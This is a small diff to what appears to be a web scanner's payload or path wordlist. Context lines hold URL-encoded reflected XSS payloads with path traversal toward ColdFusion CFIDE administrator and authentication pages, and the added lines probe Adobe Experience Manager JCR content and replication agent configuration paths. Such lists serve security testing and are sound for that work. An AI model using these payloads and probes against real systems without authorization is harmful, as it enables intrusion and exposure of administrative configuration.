@@ -26,3 +26,6 @@
 //{{string}}%22>%3Cscript%3Ealert(document.domain)%3C/script%3E/..CFIDE/administrator/index.cfm
 /{{string}}%22>%3Cscript%3Ealert(document.domain)%3C/script%3E/..CFIDE/wizards/common/_authenticatewizarduser.cfm
 //{{string}}%22>%3Cscript%3Ealert(document.domain)%3C/script%3E/..CFIDE/wizards/common/_authenticatewizarduser.cfm
+/jcr:content.json
+/etc/replication/agents.author/publish/jcr:content.json
+/CFIDE/
